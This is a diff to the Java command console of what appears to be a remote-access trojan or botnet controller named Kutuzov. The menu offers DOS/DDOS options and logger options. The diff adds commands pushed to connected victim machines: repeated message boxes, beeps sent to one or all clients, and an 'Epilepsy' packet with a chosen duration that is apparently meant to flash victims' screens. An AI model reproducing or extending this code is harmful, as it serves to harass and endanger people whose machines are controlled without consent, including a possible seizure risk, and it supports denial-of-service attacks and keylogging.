@@ -6,6 +6,7 @@ import me.kutuzov.server.client.ClientManager;
 import me.kutuzov.server.util.LoadingWheel;
 import me.pk2.moodlyencryption.MoodlyEncryption;
 
+import java.awt.*;
 import java.io.IOException;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
@@ -231,6 +232,8 @@ public class KutuzovServer {
         pnl("  2) DOS options");
         pnl("  3) Logger options");
         pnl("  4) Windows only options");
+        pnl("  5) Beep");
+        pnl("  6) Epilepsy");
         pwl("Option: ");
 
         String input = readLine();
@@ -242,9 +245,11 @@ public class KutuzovServer {
                 String title = readLine();
                 pwl("Content: ");
                 String content = readLine();
+                pwl("Amount: ");
+                int amount = Integer.parseInt(readLine());
 
                 try {
-                    client.getOutput().writeObject(new SCMessageBoxPacket(title, content));
+                    client.getOutput().writeObject(new SCMessageBoxPacket(title, content, amount));
                 } catch (Exception e) {
                     pnl("Failed to send message! (" + e.getMessage() + ")");
                     readLine();
@@ -253,6 +258,27 @@ public class KutuzovServer {
 
             case 2: {
                 user_list_client_dos_options(client);
+            } break;
+
+            case 5: {
+                try {
+                    client.getOutput().writeObject(new SCBeepPacket());
+                } catch (IOException exception) {
+                    pnl("Failed to send beep to [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
+                    readLine();
+                }
+            } break;
+
+            case 6: {
+                clearConsole();
+                pwl("Time(ms): ");
+                int time = Integer.parseInt(readLine());
+                try {
+                    client.getOutput().writeObject(new SCEpilepsyPacket(time));
+                } catch (IOException exception) {
+                    pnl("Failed to send epilepsy to [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
+                    readLine();
+                }
             } break;
 
             case 0:
@@ -291,6 +317,7 @@ public class KutuzovServer {
         pnl("  1) MessageBox all clients");
         pnl("  2) DDOS options");
         pnl("  3) User list");
+        pnl("  4) Beep all");
         pnl("  9) Stop server & exit");
         pnl("");
         pwl("Select action: ");
@@ -304,12 +331,14 @@ public class KutuzovServer {
                 String title = readLine();
                 pwl("Enter the content: ");
                 String content = readLine();
+                pwl("Enter the amount: ");
+                int amount = Integer.parseInt(readLine());
 
                 for (Map.Entry<String, Client> entry : clientManager.clients.entrySet())
                     asyncRun(() -> {
                         try {
                             ObjectOutputStream objectOutputStream = entry.getValue().getOutput();
-                            objectOutputStream.writeObject(new SCMessageBoxPacket(title, content));
+                            objectOutputStream.writeObject(new SCMessageBoxPacket(title, content, amount));
                         } catch (Exception e) { e.printStackTrace(); }});
                 menu();
                 break;
@@ -319,6 +348,15 @@ public class KutuzovServer {
                 break;
             case 3:
                 user_list();
+                menu();
+                break;
+            case 4:
+                for (Map.Entry<String, Client> entry : clientManager.clients.entrySet())
+                    asyncRun(() -> {
+                        try {
+                            ObjectOutputStream objectOutputStream = entry.getValue().getOutput();
+                            objectOutputStream.writeObject(new SCBeepPacket());
+                        } catch (Exception e) { e.printStackTrace(); }});
                 menu();
                 break;
 
